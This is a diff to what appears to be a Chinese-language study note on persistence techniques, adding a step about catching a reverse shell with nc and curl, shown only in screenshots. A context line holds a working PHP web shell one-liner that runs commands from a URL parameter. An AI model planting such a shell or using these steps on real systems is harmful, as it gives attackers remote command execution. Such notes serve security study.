@@ -226,3 +226,9 @@ Persistent
     <?php system($_GET['cmd'])?> shell.php 在受害端塞入shell，透過攻擊端瀏覽器執行受害端的指令
 ![image](https://github.com/user-attachments/assets/718b8329-bbc6-4eda-909e-f2f4a419594c)
 ![image](https://github.com/user-attachments/assets/ab920de5-84ee-49ab-91af-49233a804632)
+
+    在攻擊端用nc監聽，在使用curl將shell反彈回來
+![image](https://github.com/user-attachments/assets/57e7b3f3-4a3a-4102-afdd-01d8c82a25d6)
+![image](https://github.com/user-attachments/assets/65f59780-e211-4b42-bdc8-16c75413667e)
+
+
